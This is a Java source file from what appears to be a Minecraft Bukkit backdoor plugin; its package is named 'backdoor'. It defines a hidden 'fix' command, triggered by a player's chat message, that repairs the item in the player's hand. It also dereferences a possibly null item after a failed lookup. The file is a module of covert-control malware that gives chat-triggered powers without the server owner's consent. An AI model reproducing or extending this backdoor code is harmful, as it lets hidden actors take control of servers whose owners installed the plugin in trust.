package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;

@RegisterCommand(displayName = "fix", aliases = {"fix"})
public class FixCommand extends Command {
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Player player = event.getPlayer();
        ItemStack item = null;
        try {
            item = player.getItemInHand();
        } catch (Exception e) {
            Main.logger.log("Failed to get item in hand");
        }
        item.setDurability((short) 0);
    }
}
